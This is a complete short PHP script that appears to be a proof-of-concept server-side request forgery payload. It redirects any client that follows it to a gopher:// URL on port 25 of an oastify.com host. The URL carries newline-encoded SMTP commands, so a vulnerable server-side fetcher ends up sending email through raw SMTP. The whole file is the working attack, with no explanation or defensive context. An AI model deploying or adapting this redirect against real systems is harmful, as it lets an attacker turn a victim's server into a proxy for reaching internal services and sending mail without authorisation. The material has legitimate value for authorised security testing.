<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: <aaaaaaaaaaa@tester.com>',
                'RCPT TO: <bit-bucket@test.smtp.org>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://2svuk7wy01u9w66k6vsk615hk8qzep2e.oastify.com:25/_'.$payload);
?>
